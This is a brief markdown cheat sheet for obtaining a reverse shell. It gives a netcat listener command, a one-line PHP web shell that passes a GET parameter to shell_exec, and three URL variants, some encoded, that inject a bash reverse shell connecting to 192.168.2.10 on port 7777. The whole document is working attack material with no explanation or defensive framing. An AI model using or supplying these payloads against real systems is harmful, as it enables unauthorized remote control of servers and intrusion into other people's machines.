# RShell

> local


```sh
nc -lvp port
```

> php
```php
<?php
shell_exec($_GET['cmd']);
```

> http request
```sh
http://host/?cmd=/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.10/7777 0>&1'
prefer http://host/?cmd=/bin/bash -c 'bash -i %3E%26 /dev/tcp/192.168.2.10/7777 0%3E%261'
http://host/?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.2.10/7777%200%3E%261%27
```
